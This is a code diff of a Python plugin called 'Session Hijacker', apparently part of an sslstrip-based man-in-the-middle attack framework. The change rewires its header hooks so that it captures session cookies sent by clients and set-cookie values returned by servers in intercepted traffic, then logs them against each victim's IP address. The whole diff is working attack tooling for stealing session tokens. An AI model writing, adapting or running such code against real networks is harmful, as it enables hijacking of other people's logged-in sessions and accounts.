@@ -1,4 +1,5 @@
 from plugins.plugin import Plugin
+from sslstrip.URLMonitor import URLMonitor
 import os
 import argparse
 import logging
@@ -7,24 +8,35 @@ class SessionHijacker(Plugin):
 	name = "Session Hijacker"
 	optname = "hijack"
 	desc = "Performs session hijacking attacks against clients"
-	implements = ["sendHeaders"]
+	implements = ["cleanHeaders", "handleHeader"]
 	has_opts = False
 
 	def initialize(self, options):
 		'''Called if plugin is enabled, passed the options namespace'''
 		self.options = options
 		self.log_clients = options.clients
+		self.urlMonitor = URLMonitor.getInstance()
 
-	def sendHeaders(self, request):
-		for header, value in request.headers.items():
-			if header == 'cookie':
-				if self.log_clients:
-					log_file = open('./logs/%s.log', 'a' % request.client.getClientIP())
-					log_file.write(request.header['host'], value, "\n")
-					log_file.close()
+		print "[*] Session Hijacker plugin online"
 
-					logging.info("%s %s << Wrote cookie to logfile" % (request.client.getClientIP(), request.headers['host']))
-				else:
-					logging.info("%s %s << Got cookie: %s" % (request.client.getClientIP(), request.headers['host'], value))
+	def cleanHeaders(self, request): # Client => Server
+		headers = request.getAllHeaders().copy()
+
+		if 'cookie' in headers:
+			message = "%s Got client cookie: [%s] %s" % (request.getClientIP(), headers['host'], headers['cookie'])
+			if self.urlMonitor.isClientLogging() is True:
+				self.urlMonitor.writeClientLog(request, headers, message)
+			else:
+				logging.info(message)
+
+	def handleHeader(self, request, key, value): # Server => Client
+		if 'set-cookie' in request.client.headers:
+			cookie = request.client.headers['set-cookie']
+			#host = request.client.headers['host']
+			message = "%s Got server cookie: %s" % (request.client.getClientIP(), cookie)
+			if self.urlMonitor.isClientLogging() is True:
+				self.urlMonitor.writeClientLog(request.client, request.client.headers, message)
+			else:
+				logging.info(message)
 
 	#def add_options(options):
